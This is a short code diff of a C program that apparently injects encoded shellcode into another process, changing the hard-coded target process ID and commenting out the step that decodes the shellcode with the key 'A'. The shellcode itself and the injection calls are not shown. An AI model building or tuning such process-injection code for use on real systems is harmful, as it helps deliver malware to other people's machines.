@@ -18,14 +18,16 @@ void decodeBuffer(unsigned char* outputBuffer, int bufferLen, unsigned char key)
 
 int main()
 {
-	UINT32 TargetProcessId = 0x1c0;
+	UINT32 TargetProcessId = 17560;
 
 	// Key to decode with
 	unsigned char key = 'A';
 
 
 	int arrayLen = sizeof(SHELLCODE);
+	unsigned char* outputBuffer = SHELLCODE;
 
+	/*
 	unsigned char* outputBuffer = (unsigned char*)malloc(arrayLen);
 
 	if (outputBuffer == NULL) {
@@ -35,6 +37,8 @@ int main()
 
 	// Decode the shellcode and store it in a buffer
 	decodeBuffer(outputBuffer, arrayLen, key);
+	*/
+
 
 	// Now you have the decoded shellcode in the buffer
 	// You can use the buffer and buffer_size as needed
